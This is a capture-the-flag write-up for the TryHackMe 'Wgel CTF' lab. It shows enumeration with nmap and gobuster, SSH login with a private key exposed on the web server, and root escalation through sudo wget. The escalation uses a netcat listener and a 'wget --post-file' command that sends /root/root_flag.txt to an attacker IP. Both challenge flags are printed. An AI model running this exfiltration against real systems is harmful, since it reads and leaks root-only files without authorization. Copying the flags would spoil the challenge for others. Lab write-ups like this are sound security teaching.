# THM-**Wgel CTF**

***Author:NIKITA PANWAR***

### Scenario

Can you exfiltrate the root flag?

## 1. Initial Enumeration – Nmap Scan

The first step in any CTF is to identify open ports and running services.

I started with an aggressive Nmap scan to gather as much information as possible.

```bash
nmap -A 10.48.188.202
```

### 🔍 Key Findings

- **Port 22 (SSH)** – OpenSSH 7.2p2
- **Port 80 (HTTP)** – Apache 2.4.18
- Operating System: **Linux (Ubuntu 16.04)**

This tells us the attack surface consists mainly of **SSH** and a **web server**.

---

## 2. Web Enumeration

### 2.1 Visiting the Website

Accessing the website on port 80 showed the **default Apache page**.

While this page doesn’t expose functionality, it’s always important to:

- View page source
- Look for comments or hidden hints

### 2.2 Source Code Analysis

Inspecting the HTML source revealed an interesting comment:

```html
<!-- Jessie don't forget to udate the webiste -->
```

🔑 **Important discovery:**

This reveals a potential **username: `jessie`**

Usernames are extremely valuable for SSH and further enumeration.

---

## 3. Directory Brute Forcing with Gobuster

To find hidden directories, I used **Gobuster**.

```bash
gobusterdir -u http://10.48.188.202/ -w /usr/share/wordlists/dirb/big.txt -t 64

```

### Result

A directory called `/sitemap/` was discovered.

---

## 4. Deeper Enumeration – Sitemap Directory

Next, I scanned the `/sitemap/` directory for hidden files and folders.

```bash
gobusterdir -u http://10.48.188.202/sitemap/ -w /usr/share/wordlists/dirb/big.txt -t 64
```

### 🚨 Critical Finding

```
/.ssh/ (Status: 301)
```

This is a **major security misconfiguration**.

---

## 5. SSH Key Disclosure

Navigating to the `.ssh` directory revealed an **SSH private key (`id_rsa`)** belonging to user **jessie**.

Exposing private keys via a web server is a **critical vulnerability**.

---

## 6. Gaining Initial Access (SSH Login)

Before using the private key, correct permissions must be set:

```bash
chmod 600 id_rsa
```

Then log in via SSH:

```bash
ssh -i id_rsa jessie@10.48.167.201
```

✅ **Result:** Successful login as user `jessie`

---

## 7. User Flag Enumeration

Once logged in, the next objective is to locate the **user flag**.

I searched for `.txt` files within the home directory:

```bash
find . -type f -name"*.txt"
```

### Flag Location

```
~/Documents/user_flag.txt
```

### 🏁 User Flag

```bash
cat user_flag.txt
```

```
057c67131c3d5e42dd5cd3075b198ff6
```

---

## 8. Privilege Escalation Enumeration

To check for privilege escalation paths, I ran:

```bash
sudo -l
```

### 🔍 Output

```
(root) NOPASSWD: /usr/bin/wget
```

This means **`jessie` can run `wget` as root without a password**, which is highly dangerous.

---

## 9. Privilege Escalation via `wget`

### Why This Works

- `wget` supports **POST requests**
- Running `wget` as root allows access to **root-only files**
- We can **exfiltrate files** instead of spawning a shell

---

## Step 1: Start a Netcat Listener (Attacker Machine)

```bash
nc -lnvp 1337
```

This listens for incoming HTTP POST requests.

---

## Step 2: Exfiltrate Root Flag (Victim Machine)

```bash
sudo wget --post-file=/root/root_flag.txt http://192.168.193.9:1337
```

- `sudo` → runs as root
- `-post-file` → sends file content
- Netcat receives the data

---

## Step 3: Capture the Root Flag

Listener output:

```
POST / HTTP/1.1
User-Agent: Wget/1.17.1
Content-Length: 33

b1b968b37519ad1daa6408188649263d
```

---

## 🏁 Root Flag

```
b1b968b37519ad1daa6408188649263d
```

© 2026 — Nikita Panwar :) Happy Hacking!
